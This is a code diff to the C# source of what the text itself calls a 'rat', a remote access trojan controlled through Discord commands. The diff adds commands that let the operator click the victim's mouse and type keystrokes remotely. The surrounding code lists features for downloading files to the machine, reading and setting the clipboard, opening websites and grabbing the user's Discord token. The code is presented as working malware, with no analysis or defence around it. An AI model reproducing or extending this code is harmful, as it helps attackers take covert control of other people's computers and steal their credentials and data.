@@ -28,16 +28,28 @@ using System.Security.Policy;
 using LumiSoft.Net.AUTH;
 using Salaros.Configuration;
 using System.CodeDom;
+using System.Runtime.InteropServices;
 
 
 namespace Discord_Main
 {
     public class Fun : BaseCommandModule
     {
+
+
         private string appConfig = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\appConfig33.cfg";
 
         [DllImport("winmm.dll", EntryPoint = "mciSendStringA", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]
         public static extern int myfunc(string a, string b, int c, int d);
+
+        [DllImport("user32.dll")]
+        public static extern bool SetCursorPos(int X, int Y);
+        [System.Runtime.InteropServices.DllImport("user32.dll")]
+        public static extern void mouse_event(int dwFlags, int dx, int
+        dy, int cButtons, int dwExtraInfo);
+
+        public const int LMBDown = 0x02;
+        public const int LMBUp = 0x04;
 
         [Command("Commandlist"), Description("Shows all commands and what they do.")]
         public async Task Commandlist(CommandContext ctx)
@@ -59,11 +71,14 @@ namespace Discord_Main
                 "!Mousepos(x position, y position) = Set mouse position.\n" +
                 "!Download_from_url(url, filename) = Downloads a file from url to computer.\n" +
                 "!Set_Group(channel) Sets the group of the computer.Max groups are 1.\n" +
+                "!Remove_Group Remove group from computer.\n" +
                 "!Get_Group Gets the group this computer is in.\n" +
                 "!PingIp(ip, data) Ping a url/server/ip.\n" +
                 "!Website(url) Open Website.\n" +
                 "!Clipboard Get clipboard.\n" +
                 "!Set_Clipboard(Text) Set clipboard.\n" +
+                "!Click click\n" +
+                "!Write(Text) write words.\n" +
                 "!Exit = Close the rat.\n" +
                 "```"
                 );
@@ -392,6 +407,24 @@ namespace Discord_Main
             staThread.Start();
             staThread.Join();
             ctx.Channel.SendMessageAsync("Setting clipboard.");
+        }
+        [Command("Click"), Description("Click.")]
+        public async Task Click(CommandContext ctx)
+        {
+            if (channelcheck(ctx.Channel.Id.ToString()) == false)
+                return;
+            mouse_event(LMBDown, 128, 256, 0, 0);
+            mouse_event(LMBUp, 128, 256, 0, 0);
+            ctx.Channel.SendMessageAsync("Clicked.");
+        }
+
+        [Command("Write"), Description("Write words.")]
+        public async Task Click(CommandContext ctx, string text)
+        {
+            if (channelcheck(ctx.Channel.Id.ToString()) == false)
+                return;
+            SendKeys.SendWait(text);
+            ctx.Channel.SendMessageAsync("Typed keys.");
         }
 
         [Command("Gettoken"), Description("Gets discord token.")]
